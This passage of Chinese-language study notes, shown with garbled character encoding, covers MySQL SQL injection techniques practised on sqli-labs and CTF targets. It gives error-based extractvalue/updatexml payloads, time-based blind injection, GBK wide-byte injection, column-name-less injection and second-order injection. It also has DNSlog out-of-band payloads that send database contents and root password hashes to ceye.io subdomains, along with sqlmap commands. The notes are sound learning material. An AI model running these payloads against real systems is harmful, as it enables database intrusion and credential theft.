3. **å°±æ˜¯åˆ©ç”¨joinä½¿å¾—mysqlåˆ—åé‡å¤ï¼ŒæŠ¥é”™è¿”å›é‡å¤çš„åˆ—åå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯**

> é€šè¿‡å¯¹æƒ³è¦æŸ¥è¯¢åˆ—åçš„è¡¨ä¸å…¶è‡ªèº«å»ºè®®å†…è¿æ¥ï¼Œä¼šç”±äºå†—ä½™çš„åŸå› (ç›¸åŒåˆ—åå­˜åœ¨)ï¼Œè€Œå‘ç”Ÿé”™è¯¯ã€‚
>
> å¹¶ä¸”æŠ¥é”™ä¿¡æ¯ä¼šå­˜åœ¨é‡å¤çš„åˆ—åï¼Œå¯ä»¥ä½¿ç”¨ USING è¡¨è¾¾å¼å£°æ˜å†…è¿æ¥ï¼ˆINNER JOINï¼‰æ¡ä»¶ã€æ’å»é‡å¤çš„åˆ—åæœ€åå¾—åˆ°å…¨éƒ¨åˆ—åä¿¡æ¯ã€‘æ¥é¿å…æŠ¥é”™

![join](https://img2020.cnblogs.com/blog/1625650/202003/1625650-20200329143159098-1312087130.png)





#### extractvalue()ã€updatexml()

[å¤§ä½¬csdn](https://blog.csdn.net/zpy1998zpy/article/details/80631036)    ã€ [é˜¿é‡Œäº‘](https://developer.aliyun.com/article/692723)ã€ã€[è¯¦è§£](https://my.oschina.net/u/4610683/blog/4492284) ã€[ç‹å¹ä¹‹ä¹Ÿæœ‰](https://www.cnblogs.com/wangtanzhi/p/12577891.html)

```
extractvalue() :å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°
è¯­æ³•ï¼šextractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)

ç¬¬äºŒä¸ªå‚æ•° xmlä¸­çš„ä½ç½®æ˜¯å¯æ“ä½œçš„åœ°æ–¹ï¼Œxmlæ–‡æ¡£ä¸­æŸ¥æ‰¾å­—ç¬¦ä½ç½®æ˜¯ç”¨ /xxx/xxx/xxx/â€¦è¿™ç§æ ¼å¼ï¼Œå¦‚æœæˆ‘ä»¬å†™å…¥å…¶ä»–æ ¼å¼ï¼Œå°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”ä¼šè¿”å›æˆ‘ä»¬å†™å…¥çš„éæ³•æ ¼å¼å†…å®¹ï¼Œè€Œè¿™ä¸ªéæ³•çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹ã€‚

æ­£å¸¸æŸ¥è¯¢ ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®æ ¼å¼ ä¸º /xxx/xx/xx/xx ,å³ä½¿æŸ¥è¯¢ä¸åˆ°ä¹Ÿä¸ä¼šæŠ¥é”™

select username from security.user where and (extractvalue(â€˜anythingâ€™,concat(â€˜/â€™,(select database()))))
è¿™é‡Œåœ¨â€™anythingâ€™ä¸­æŸ¥è¯¢ ä½ç½®æ˜¯ /database()çš„å†…å®¹ï¼Œ

ä½†æ˜¯ï¼š
select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,concat(â€˜~â€™,(select database()))))
**å¯ä»¥çœ‹å‡ºï¼Œä»¥~å¼€å¤´çš„å†…å®¹ä¸æ˜¯xmlæ ¼å¼çš„è¯­æ³•ï¼ŒæŠ¥é”™ï¼Œä½†æ˜¯ä¼šæ˜¾ç¤ºæ— æ³•è¯†åˆ«çš„å†…å®¹æ˜¯ä»€ä¹ˆ**ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†ç›®çš„ã€‚å½“ç„¶concatç¬¬ä¸€ä¸ªå‚æ•°æ˜¯/æ—¶**ä¸ä¼šæŠ¥é”™**
```



```mysql
updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

updatexml()å‡½æ•°ä¸extractvalue()ç±»ä¼¼ï¼Œæ˜¯æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°ã€‚

è¯­æ³•updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)

select username from security.user where id=1 and (updatexml(â€˜anythingâ€™,â€™/xx/xxâ€™,â€™anythingâ€™))

é€šè¿‡æŸ¥è¯¢@@version,è¿”å›ç‰ˆæœ¬ã€‚ç„¶åCONCATå°†å…¶å­—ç¬¦ä¸²åŒ–ã€‚å› ä¸ºUPDATEXMLç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²,æ‰€ä»¥ä¸ç¬¦åˆè¦æ±‚ï¼Œç„¶åå›æ˜¾æŠ¥é”™ã€‚

é”™è¯¯å¤§æ¦‚ä¼šæ˜¯ï¼š
ERROR 1105 (HY000): XPATH syntax error: â€™:root@localhostâ€™   //åˆ™çˆ†å‡ºä¿¡æ¯
```

æ³¨æ„ï¼š

- updatexmlæ˜¯ä¸‰ä¸ªå‚æ•°ï¼Œä¸­é—´å‚æ•°é…åˆconcatæ³¨å…¥ï¼Œconcatä¸€ä¸‰å‚æ•°æ ‡è¯†å›æ˜¾ç»“æœçš„å¤´å’Œå°¾ï¼Œ`0x7e`æ˜¯`~`
- extractvalueä¸¤ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°é…åˆconcat
- **extractvalue()å’Œupdatexml()**åªèƒ½å›æ˜¾==32ä½é•¿åº¦==çš„æ•°æ®
- <span style="background:#bbffff;"> selectï¼Œinsertï¼Œupdateæ²¡æœ‰å›æ˜¾çš„éƒ½å¯ä»¥ä½¿ç”¨</span>



çˆ†å‡ºæ‰€æœ‰è¡¨å

```mysql
http://www.anantest.com:8080/sqlilabs/Less-3/
?id=1') and updatexml(1,concat(0x23,(select group_concat(schema_name) from information_schema.schemata )),1)-

//çˆ†è¡¨å:
or extractvalue(1, concat(0x7e, (select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))
çˆ†å­—æ®µå:
or extractvalue(1, concat(0x7e, (select concat(column_name) from information_schema.columns where table_name='users' limit 0,1)))
çˆ†æ•°æ®:
or extractvalue(1, concat(0x7e, (select concat_ws(':', username, password) from users limit 0,1))) or ''
```





#### [ **floor**](https://www.cnblogs.com/c1047509362/p/12806297.html)





### æ—¶é—´ç›²æ³¨

> ç”¨å·¥å…·ã€è„šæœ¬

1. ä¸å¸ƒå°”ç›²æ³¨ç±»ä¼¼ï¼Œä½†æ˜¯æ— æ³•é€šè¿‡è¿”å›ä¿¡æ¯åˆ¤æ–­å¯¹é”™ï¼Œå› ä¸ºåªè¿”å›trueã€‚å¯é€šè¿‡æ—¶é—´å‡½æ•°sleepï¼Œ**<span style="background:#BBFFBB;">é€šè¿‡webé¡µé¢å“åº”æ—¶é—´åˆ¤æ–­æ³¨å…¥è¯­å¥æ˜¯å¦æˆåŠŸ</span>**
2. ç”¨`if`å’Œ`sleep`å‡½æ•°åˆ¤æ–­æ˜¯tureè¿˜æ˜¯false
<u>æ­£ç¡®å°±å»¶è¿Ÿnç§’è¿”å›ï¼Œé”™è¯¯å°±0sè¿”å›</u>

```
ifç±»ä¼¼ä¸‰ç›®è¿ç®—
if(æ¡ä»¶,expr2,expr3)ï¼Œå¦‚æœæ¡ä»¶ä¸ºtrue,åˆ™è¿”å›expr2çš„å€¼ï¼Œå¦åˆ™è¿”å›3
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439844.png" alt="image-20210726204326926" style="zoom:67%;" />

<span style="background:#bbffff;">sleepå¯ä»¥æ”¾åœ¨ifçš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯ifæ”¾åœ¨sleepé‡Œ</span>

```
select * from member where id=1 and sleep (if (database ()='a',1,0));
å¦‚æœdatabaseæ˜¯aåˆ™åœ1så¦åˆ™ä¸åœ
id=2 and  sleep( if(  (SELECT count(SCHEMA_NAME) FROM information_schema.SCHEMATA) = 7,    0,5 ))
å¥½åƒè¿™ä¸ªæ˜¯è¯´å¦‚æœæ•°æ®åº“æ€»æ•°ç­‰äº7çš„è¯0sè¿”å›å¦åˆ™5s
```
3. å…¶ä»–æ“ä½œå¦‚è·å–åº“åã€è¡¨åã€çˆ†ç ´å­æ®µç­‰ç­‰åŒå¸ƒå°”æ³¨å…¥ï¼Œåªæ˜¯é€šè¿‡sleepå‡½æ•°æŸ¥çœ‹æ˜¯å¦æˆåŠŸ




### å®½å­èŠ‚æ³¨å…¥
- [**ç²¾ç®€ï¼ŒCSDN åŸç†åŠé˜²å¾¡](https://blog.csdn.net/u011721501/article/details/42874517)
- [å°‘ï¼Œæ˜“ç†è§£ï¼Œç®€ä¹¦](https://www.jianshu.com/p/7af00dcdd5d1)
- [***ä¸ªäººåšå®¢ï¼Œå†…å®¹ç‚¹åŸºç¡€ä½†é¢é¢ä¿±åˆ°æ˜“ç†è§£](https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/)
- [è·Ÿå‰é¢å·®ä¸å¤šï¼Œéƒ½æ˜¯å¾ˆåŸºç¡€/å¸¸è§çš„è®²è§£ï¼Œä½†é…æœ‰ä¾‹å­ï¼ŒåŠsqlmapæ€ä¹ˆå®½å­èŠ‚æ³¨å…¥](https://www.cnblogs.com/zhaoyixiang/p/10970117.html)


> è¦ç‚¹ï¼š
- ä¸»è¦æ˜¯ç»•è¿‡ç¼–ç æ¼æ´ä½¿å•å¼•å·é€ƒé€¸ï¼Œè®©ä»–é—­åˆæ‰å‰é¢çš„æŸ¥è¯¢ï¼Œä¸è¢«è½¬ä¹‰
- PHPç¼–ç ä¸ºUTF-8è€ŒMysqlçš„ç¼–ç è®¾ç½®ä¸º`setÂ  names 'gbk'`æˆ–æ˜¯`set character_set_client=gbk`ï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´(**ä¸€ä¸ªgbkç¼–ç æ±‰å­—ï¼Œå ç”¨2ä¸ªå­—èŠ‚ï¼Œä¸€ä¸ªutf-8ç¼–ç çš„æ±‰å­—ï¼Œå ç”¨3ä¸ªå­—èŠ‚**ï¼‰
- ç”±äºå®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå°†åé¢çš„ä¸€ä¸ªå­—èŠ‚ä¸å‰ä¸€ä¸ªå¤§äº128çš„asciiç è¿›è¡Œç»„åˆæˆä¸ºä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ï¼ˆmysqlåˆ¤æ–­ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯æ±‰å­—ï¼Œé¦–å…ˆä¸¤ä¸ªå­—ç¬¦æ—¶ä¸€ä¸ªæ±‰å­—ï¼Œå¦å¤–æ ¹æ®gbkç¼–ç ï¼Œ**ç¬¬ä¸€ä¸ªå­—èŠ‚asciiç å¤§äº128ï¼ŒåŸºæœ¬ä¸Šå°±å¯ä»¥äº†**ï¼‰ï¼Œæ­¤æ—¶â€™å‰çš„\å°±è¢«åƒäº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨â€™äº†ï¼Œ
- **åªè¦æŠ¥é”™å°±è¯´æ˜å•å¼•å·é€ƒé€¸ï¼Œèµ·äº†ä½œç”¨ï¼Œç•™äº†ä¸€ä¸ªå•çš„å¼•å·ï¼Œè¯­æ³•é”™è¯¯**
- **åŠ äº†å•å¼•å·ä¸æŠ¥é”™ï¼Œè¯´æ˜å•å¼•å·è¢«è½¬ä¹‰æˆ–è€…è¢«addslasheså‡½æ•°è¿‡æ»¤æ‰äº†**

- ä¸€èˆ¬å¸¸è§çš„å®½å­—ç¬¦æ³¨å…¥
```
%df%27===>(addslashes)====>%df%5c%27====>(GBK)====>é‹â€™
ç”¨æˆ·è¾“å…¥==>è¿‡æ»¤å‡½æ•°==>ä»£ç å±‚çš„$sql==>mysqlå¤„ç†è¯·æ±‚==>mysqlä¸­çš„sql
http://www.xxx.com/login.php?user=%dfâ€™ or 1=1 limit 1,1%23&pass=
å…¶å¯¹åº”çš„sqlå°±æ˜¯ï¼š
select * fromcms_user where username = â€˜é‹â€™ or 1=1 limit 1,1#â€™ and password=â€
```


#### å¥—è·¯
1. è¯•æ¢æ˜¯å¦æœ‰æ³¨å…¥æ¼æ´urlé‡Œè¾“å…¥
`admin%df%27`
2. çˆ†åˆ—æ•°`?id=1%df%27 order by 2# `Â 
    åˆ—æ•°å¾—çŸ¥ 2åˆ—ã€‚
3. çˆ†åº“ï¼š
    `?id=-1%df%27 union select 1,database()%23`
    æ•°æ®åº“:sae-chinalover
4. çˆ†åˆ—è¡¨:
```
?id=-1%df%27 union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x7361652d6368696e616c6f766572%23
```
  çˆ†å‡ºè¿™äº›è¡¨:
ctf,ctf2,ctf3,ctf4,gbksqli,news

5. çˆ†å­—æ®µï¼š
```
?id=-1%df%27 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x63746634%23
```
å­—æ®µ:id flag
6. æŸ¥è¯¢å…³é”®å­—ï¼š
`?id=-1%df%27 union select 1,flag from ctf4%23`

7. åˆ©ç”¨**sqlmap**
```
sqlmap -u "http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27"
```





### æ— åˆ—åæ³¨å…¥

[csdn](https://blog.csdn.net/qq_40500631/article/details/89631904)

1. æ— åˆ—åæ³¨å…¥ä¸»è¦æ˜¯é€‚ç”¨äº**å·²ç»è·å–åˆ°æ•°æ®è¡¨å**ï¼Œä½†æ— æ³•æŸ¥è¯¢åˆ—çš„æƒ…å†µä¸‹ï¼Œåœ¨å¤§å¤šæ•° CTF é¢˜ç›®ä¸­ï¼Œinformation_schema åº“è¢«è¿‡æ»¤ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•è·å–åˆ—åã€‚
2. é€šè¿‡å¯¹è¦æŸ¥è¯¢çš„åˆ—èµ·åˆ«åï¼Œå¹¶æŸ¥è¯¢è¿™ä¸ªåˆ«åå°†æ•°æ®æŸ¥å‡ºï¼Œè¾¾åˆ°æœªçŸ¥åˆ—åï¼Œä¾æ—§æŸ¥è¯¢åˆ°ä¿¡æ¯çš„æ•ˆæœ
3. è¦ç‚¹ï¼š==ä½¿ç”¨åå¼•å·`åŠ æ•°å­—è¡¨ç¤º**åˆ—åæˆ–è€…è¡¨å**ï¼Œæˆ–è€…ç”¨åˆ«åè¡¨ç¤ºã€åå¼•å·è¢«è¿‡æ»¤æ—¶ã€‘ã€**a.3**ã€‘==
4. ==[ä¹Ÿå¯ä»¥ä½¿ç”¨joinæŠ¥é”™è¿›è¡Œæ— åˆ—åæ³¨å…¥](https://www.cnblogs.com/GH-D/p/11962522.html)==



![image-20210522141728684](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439845.png)

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439846.png" alt="image-20210522134617792" style="zoom:50%;" />

```mysql
//è¡¨æœ‰5åˆ—,åˆ—åä¸ºid,name,pass,mail,phone
select 1,2,3,4,5 union select*from users;   //åˆ—åå˜æˆ12345ï¼ŒæœªçŸ¥å®é™…åˆ—åï¼Œå‰ææ˜¯è¦çŸ¥é“è¡¨å 
//ç»§ç»­ä½¿ç”¨æ•°å­—æ¥å¯¹åº”åˆ—,å¦‚3å¯¹åº”äº†è¡¨é‡Œé¢çš„pass:
select`3`from (select 1,2,3,4,5 union select*from users)a;
//å½“`ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š
select b from (select 1,2,3 as b,4,5 union select*from users)a;
//åœ¨æ³¨å…¥ä¸­æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š
select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select *from users)a limit 1,1;  //0x3aè¡¨ç¤ºï¼š
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439848.png" alt="image-20210522134817435"  />



#### æ€»ç»“ï¼Œä¸€èˆ¬å¥—è·¯ï¼š

åˆ«åæ³•ï¼š

```mysql
(select `2` from (select 1,2,3 union select * from table_name)a)  //å‰ææ˜¯è¦çŸ¥é“è¡¨å 
```

```mysql
((select c from (select 1,2,3 c union select * from users)b))    1ï¼Œ2ï¼Œ3æ˜¯å› ä¸ºusersè¡¨æœ‰ä¸‰åˆ—ï¼Œå®é™…æƒ…å†µè¿˜éœ€è¦çŒœæµ‹è¡¨çš„åˆ—çš„æ•°é‡
```

```mysql
select a.3 from (select 1,2,3 union select * from users) as a;
```

joinæ³•ï¼š

```mysql
select * from (select * from users as a join users b)c;  //çˆ†åˆ—å
ERROR 1060(42S21):Duplicate column name 'username'  //å¾—åˆ°åˆ—åusername
```



```
-1' union select 1, (select group_concat(a) from(select 1 as s,2 as a,3 as b union select * from users)as m),3,4,5,6'
//ä¸€ä¸ªæŸ¥è¯¢è¯­å¥çš„æ¡ä»¶éœ€è¦å¦ä¸€ä¸ªæŸ¥è¯¢è¯­å¥æ¥è·å–ï¼Œå†…å±‚æŸ¥è¯¢è¯­å¥çš„æŸ¥è¯¢ç»“æœï¼Œå¯ä»¥ä¸ºå¤–å±‚æŸ¥è¯¢è¯­å¥æä¾›æŸ¥è¯¢æ¡ä»¶ï¼ŒæŠŠusersä¸­ç¬¬ä¸€åˆ—åˆ«ås,ç¬¬äºŒåˆ—åˆ«åaï¼Œç¬¬ä¸‰åˆ—åˆ«åbï¼ŒæŸ¥è¯¢å¾—åˆ°æ–°çš„è¡¨åˆ«åmï¼Œä¾›ç»™å¤–éƒ¨æŸ¥è¯¢aåˆ—
```



## ğŸ±â€ğŸæ³¨å…¥æ‹“å±•

#### åŠ è§£å¯†

> sqlilabs 21å…³

å…³é”®ç‚¹ï¼šæ³¨å…¥çš„è¯­å¥åŠ å¯†åå‘é€

- å…³è”sqlmapï¼š
  - é…åˆå‚æ•°tamperï¼Œè‡ªå¸¦æ’ä»¶ï¼Œä½¿ç”¨å¤–éƒ¨.pyæ–‡ä»¶å®ç°ä¾‹å¦‚base64æ³¨å…¥ç‚¹
  - ä¹Ÿå¯ä»¥ä¸ç”¨æ’ä»¶è‡ªå·±å†™è„šæœ¬é…åˆsqlmapã€<span style="background:#FF9999;">ä¸­è½¬æ³¨å…¥</span>ã€‘
    - ![image-20210727204045560](https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439849.png)
    - ç„¶å`sqlmap -u "http://127.0.0.1:8080/test.php?x=" -v 3`ï¼Œ  `-v 3`æ˜¯sqlmapæ˜¾ç¤ºæ³¨å…¥è¯­å¥

#### JSONæ³¨å…¥

#### LADPæ³¨å…¥

#### DNSlogæ³¨å…¥

> sqlilabs 9  load_file+dnslogå¸¦å¤–æ³¨å…¥

> http://ceye.io/profileã€å…è´¹çš„è®°å½•dnslogçš„å¹³å°ã€‘
>
> https://github.com/ADOOO/DnslogSqlinjã€winä¸‹ã€‘
>
> http://www.dnslog.cn
>
> http://admin.dnslog.link/

> [ä¸ªäººåšå®¢è¯¦è§£1](https://www.cnblogs.com/-qing-/p/10623583.html)ã€[*3](https://www.cnblogs.com/xhds/p/12322839.html)ã€[**freebuf](https://www.freebuf.com/sectool/280777.html)

1. ç”¨æˆ·å¾—æ˜¯rootï¼Œæœ‰è¯»å†™æ–‡ä»¶çš„æƒé™
2. è§£å†³äº†ç›²æ³¨è¿˜ä¸èƒ½*å›æ˜¾æ•°æ®*ï¼Œæ•ˆç‡ä½çš„é—®é¢˜,**å¦å¤–è¦å‘é€å¤§é‡çš„getè¯·æ±‚ï¼Œé‚£ä¹ˆè¿™ç§è¡Œä¸ºå¾ˆå®¹æ˜“è¢«ç›®æ ‡ç‰©ç†é˜²ç«å¢™è®¤å®šä½æ˜¯é»‘å®¢è¡Œä¸ºï¼Œæœ€ç»ˆå¯¼è‡´IPè¢«banã€‚è€ŒDNSä¸ä¼š**

- åŸç†
  - DNSåœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œå’±ä»¬è¿™ä¸ªå°±æ˜¯è¯»å–å¤šçº§åŸŸåçš„è§£ææ—¥å¿—ï¼Œæ¥è·å–ä¿¡æ¯
    **ç®€å•æ¥è¯´å°±æ˜¯æŠŠä¿¡æ¯æ”¾åœ¨é«˜çº§åŸŸåä¸­ï¼Œä¼ é€’åˆ°è‡ªå·±è¿™ï¼Œç„¶åè¯»å–æ—¥å¿—ï¼Œè·å–ä¿¡æ¯**
  - åŸç†ä¸Šåªè¦èƒ½è¿›è¡ŒDNSè¯·æ±‚çš„å‡½æ•°éƒ½å¯èƒ½å­˜åœ¨DNSlogæ³¨å…¥ã€‚
- åº”ç”¨æ¡ä»¶
  - <span style="background:#FF9999;">windowsä¸‹</span>Mysqlã€å› ä¸ºLinuxæ²¡æœ‰UNCè·¯å¾„ï¼Œæ‰€ä»¥å½“å¤„äºLinuxç³»ç»Ÿæ—¶ï¼Œä¸èƒ½ä½¿ç”¨è¯¥æ–¹å¼è·å–æ•°æ®ã€‘
  - è¿”å›æ•°æ®æ²¡æœ‰ç‰¹æ®Šç¬¦å·
  - **load_fileå‡½æ•°ï¼Œã€<span style="background:#FF9999;">æ‰€ä»¥ä¸€èˆ¬å¾—æ˜¯rootæƒé™</span>ã€‘ï¼Œ**load_file()ä¸ä»…èƒ½å¤ŸåŠ è½½æœ¬åœ°æ–‡ä»¶ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¯¹è¯¸å¦‚www.test.comè¿™æ ·çš„URLå‘èµ·è¯·æ±‚ã€‚
- åº”ç”¨åœºæ™¯

  - SQLæ³¨å…¥ä¸­çš„ç›²æ³¨
    åœ¨sqlæ³¨å…¥æ—¶ä¸ºå¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ï¼Œæ³¨å…¥çš„æ•ˆç‡ä½ä¸”çº¿ç¨‹é«˜å®¹æ˜“**è¢«wafæ‹¦æˆª**ï¼Œåˆæˆ–è€…æ˜¯ç›®æ ‡ç«™ç‚¹**æ²¡æœ‰å›æ˜¾**
  - æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ
    æˆ‘ä»¬åœ¨è¯»å–æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤æ³¨å…¥ç­‰æ“ä½œæ—¶æ— æ³•æ˜æ˜¾çš„ç¡®è®¤æ˜¯å¦åˆ©ç”¨æˆåŠŸ
  - æ— å›æ˜¾çš„SSRF
  - **<span style="background:#FF9999;">æ€»ä¹‹å°±æ˜¯é¶æœºä¸è®©ä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœé¶æœºèƒ½å‘é€è¯·æ±‚ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°è¯•å’±è¿™ä¸ªåŠæ³•â€”â€”ç”¨DNSlogæ¥è·å–å›æ˜¾</span>**



- [load_file](https://www.xcnte.com/archives/512/)--**è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚**

  - **å¿…é¡»æŒ‡å®šæ–‡ä»¶==å®Œæ•´çš„è·¯å¾„==**

  - ```
    SELECT LOAD_FILE('/data/test.txt') AS Result; //è¿”å›testæ–‡ä»¶å†…å®¹
    ```
  
  - å‚æ•°å¯ä»¥æ˜¯`char()`æˆ–è€…åå…­è¿›åˆ¶`hex()`çš„å½¢å¼
  
  

æ™®é€šå›æ˜¾winï¼š

```
ping %USERNAME%.j1wbye.ceye.io
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439850.png" alt="image-20210728162212024" style="zoom: 67%;" /><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401041439851.png" alt="image-20210728162224771" style="zoom:67%;" />

SQLæ³¨å…¥ï¼š


```mysql
load_file(concat('\\\\',(select database()),'.abcdef.ceye.io\\sql')) //é‡ç‚¹
æ‰€ä»¥å°±ç­‰åŒäºè®¿é—®äº†database().abcdef.ceye.ioï¼Œç„¶åæˆ‘ä»¬çš„ceyeå¹³å°å°±ä¼šæœ‰è®°å½•ï¼Œé‚£ä¹ˆdatabase()å°±å¾—åˆ°äº†ï¼Œ\\sqlæ˜¯åŸŸåç›®å½•ï¼Œéšæ„å³å¯ï¼Œselect database()æ¢æˆsqlæ³¨å…¥payloadå³å¯

  è¦æ³¨æ„çš„æ˜¯æ•°æ®å¾ˆå¯èƒ½ä¸æ­¢ä¸€è¡Œï¼Œå› æ­¤è¦ç”¨limitåˆ†æ¬¡è¾“å‡ºã€‚
  
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc')); ã€limitååŠ 1ä¸ªæ•°å­—ï¼šå‰å‡ è¡Œã€‘
  
1. æŸ¥è¯¢æ•°æ®åº“å
http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select database()),'.cmr1ua.ceye.io\\abc'))--+

2. è·å–æ•°æ®è¡¨
http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.cmr1ua.ceye.io\\abc'))--+

3. è·å–è¡¨ä¸­çš„å­—æ®µå
' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.cmr1ua.ceye.io\\abc'))--+

4. è·å–è¡¨ä¸­å­—æ®µä¸‹çš„æ•°æ®
' and load_file(concat('\\\\',(select password from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
' and load_file(concat('\\\\',(select username from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+

//æ³¨æ„ï¼âš 
//å› ä¸ºåœ¨load_fileé‡Œé¢ä¸èƒ½ä½¿ç”¨@ ~ç­‰ç¬¦å·æ‰€ä»¥è¦åŒºåˆ†æ•°æ®æˆ‘ä»¬å¯ä»¥å…ˆç”¨group_ws()å‡½æ•°åˆ†å‰²åœ¨ç”¨hex()å‡½æ•°è½¬æˆåå…­è¿›åˆ¶å³å¯ 
å‡ºæ¥äº†å†è½¬å›å»
' and load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
```



[Sqlmapæ”¯æŒdnså›æ˜¾æ³¨å…¥](https://www.freebuf.com/column/226091.html)

â€‹	åœ¨sqlmapä¸­å®ç°DNSæ³¨å…¥åŠ ä¸Šå‚æ•°

â€‹	åœ¨æœåŠ¡å™¨å®‰è£…å¥½äº†sqlmapç„¶åè¿è¡Œdns.py

```
	--dns-domain=åŸŸå
python sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-2/?id=1" --tech B --dns-domain 192.168.0.18 --dbs
```

â€‹	å³å¯å®ç°è‡ªåŠ¨åŒ–



#### äºŒæ¬¡æ³¨å…¥

<span style="background:#FF9999;">å‰ç«¯æ‰¾ä¸åˆ°ï¼Œ**æ‰«æå·¥å…·ä¹Ÿæ— æ•ˆï¼** **åªèƒ½é äººå·¥**</span>

> sqlilab ç™»å½•æ¡†+24å…³

> [**CSDNç®€æ´ç‰ˆ](https://blog.csdn.net/weixin_44262289/article/details/107699595?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.control&spm=1001.2101.3001.4242)
>
> [freebufç§‘æ™®åŠ ä¾‹é¢˜+å¼ºç½‘æ¯](https://www.freebuf.com/articles/web/167089.html)
>
> CTF-[ç½‘é¼æ¯2018]Unfinishã€buu/cuthubã€‘

æ³¨å†Œç”¨æˆ·ï¼šæ’å…¥æ•°æ®ï¼Œä¿®æ”¹å¯†ç ï¼šæ›´æ–°æ•°æ®

å…ˆæ³¨å†Œç”¨æˆ·ï¼Œå¯¹ç”¨æˆ·ååšé©¬è„šç„¶åä¿®æ”¹å¯†ç æ—¶å®ç°å¯¹å…¶ä»–è´¦å·çš„æ³¨å…¥

- å…³é”®ç‚¹ï¼šæ’å…¥å±é™©æ•°æ®=ã€‹æ˜¾ç¤ºå±é™©æ•°æ®

- **æ ¸å¿ƒåŸç†ï¼š**

**æå‰æŠŠå±é™©è¯­å¥æ’å…¥æ•°æ®åº“ï¼ˆæ’å…¥ï¼‰ï¼Œæ•°æ®åœ¨å­˜å…¥æ•°æ®åº“åè¿˜åŸæˆäº†ç”¨æˆ·è¾“å…¥çš„å½¢å¼ï¼Œå½“åœ¨æ•°æ®åº“å–å‡ºçš„æ—¶å€™ï¼ˆæ›´æ–°/æŸ¥è¯¢ï¼‰ï¼Œæ²¡æœ‰å†æ¬¡è¿›è¡Œè¿‡æ»¤å’Œè½¬ä¹‰ï¼Œæ‰§è¡Œè¯­å¥å¯¼è‡´é”™è¯¯ï¼Œä»è€Œé€ æˆäº†äºŒæ¬¡æ³¨å…¥ã€‚**



Q:äºŒæ¬¡æ³¨å…¥å¯èƒ½å­˜åœ¨åœ¨ä»€ä¹ˆåœ°æ–¹

- å­˜åœ¨è½¬ä¹‰å‡½æ•°çš„åœ°æ–¹
- åœ¨<span style="background:#bbffff;">å›æº¯æ•°æ®è¾“å…¥çš„åœ°æ–¹ï¼Œå¦‚ä¿®æ”¹ç”¨æˆ·è´¦æˆ·å¯†ç ã€ä¿®æ”¹æ–‡ç« æ ‡é¢˜</span>
